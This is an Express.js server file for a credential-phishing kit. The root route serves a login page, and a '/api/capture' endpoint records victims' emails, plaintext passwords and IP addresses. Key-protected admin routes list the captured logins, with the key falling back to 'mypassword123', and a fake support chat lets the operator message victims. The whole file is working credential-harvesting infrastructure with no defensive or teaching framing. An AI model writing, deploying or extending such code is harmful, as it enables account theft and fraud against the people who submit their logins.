require('dotenv').config();
const express = require('express');
const cors = require('cors');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

const app = express();
const PORT = process.env.PORT || 3000;
const ADMIN_KEY = process.env.ADMIN_SECRET_KEY || 'mypassword123';

app.use(cors());
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

let capturedLogins = [];
let chatMessages = [];

chatMessages.push({
    id: uuidv4(),
    text: 'Hello! How can we help you?',
    from: 'admin',
    timestamp: new Date().toISOString()
});

app.post('/api/capture', (req, res) => {
    const { email, password } = req.body;
    const ip = req.ip;
    if (!email || !password) return res.status(400).json({ error: 'Required' });
    capturedLogins.unshift({ id: uuidv4(), email, password, ip, timestamp: new Date().toISOString(), isNew: true });
    chatMessages.push({ id: uuidv4(), text: 'New login: ' + email, from: 'system', timestamp: new Date().toISOString() });
    console.log('Login captured: ' + email);
    res.json({ success: true });
});

app.get('/api/admin/check', (req, res) => {
    const key = req.headers['x-admin-key'] || req.query.key;
    res.json({ valid: key === ADMIN_KEY });
});

app.get('/api/admin/stats', (req, res) => {
    const key = req.headers['x-admin-key'] || req.query.key;
    if (key !== ADMIN_KEY) return res.status(401).json({ error: 'Invalid' });
    const today = capturedLogins.filter(i => new Date(i.timestamp).toDateString() === new Date().toDateString()).length;
    res.json({ total: capturedLogins.length, today, weekLogins: 0, uniqueIPs: 0 });
});

app.get('/api/admin/logins', (req, res) => {
    const key = req.headers['x-admin-key'] || req.query.key;
    if (key !== ADMIN_KEY) return res.status(401).json({ error: 'Invalid' });
    res.json({ logins: capturedLogins });
});

app.delete('/api/admin/logins/:id', (req, res) => {
    capturedLogins = capturedLogins.filter(i => i.id !== req.params.id);
    res.json({ success: true });
});

app.delete('/api/admin/logins', (req, res) => {
    capturedLogins = [];
    res.json({ success: true });
});

app.get('/api/chat/messages', (req, res) => {
    res.json({ messages: chatMessages.slice(-100) });
});

app.post('/api/chat/user', (req, res) => {
    const { text } = req.body;
    if (!text) return res.status(400).json({ error: 'Empty' });
    chatMessages.push({ id: uuidv4(), text, from: 'user', timestamp: new Date().toISOString() });
    res.json({ success: true });
});

app.post('/api/chat/admin', (req, res) => {
    const key = req.headers['x-admin-key'] || req.query.key;
    if (key !== ADMIN_KEY) return res.status(401).json({ error: 'Invalid' });
    const { text } = req.body;
    chatMessages.push({ id: uuidv4(), text, from: 'admin', timestamp: new Date().toISOString() });
    res.json({ success: true });
});

app.get('/', (req, res) => res.sendFile(path.join(__dirname, 'public', 'login.html')));
app.get('/admin', (req, res) => res.sendFile(path.join(__dirname, 'public', 'admin.html')));

app.listen(PORT, () => {
    console.log('Server running on http://localhost:' + PORT);
    console.log('Admin: http://localhost:' + PORT + '/admin?key=' + ADMIN_KEY);
});
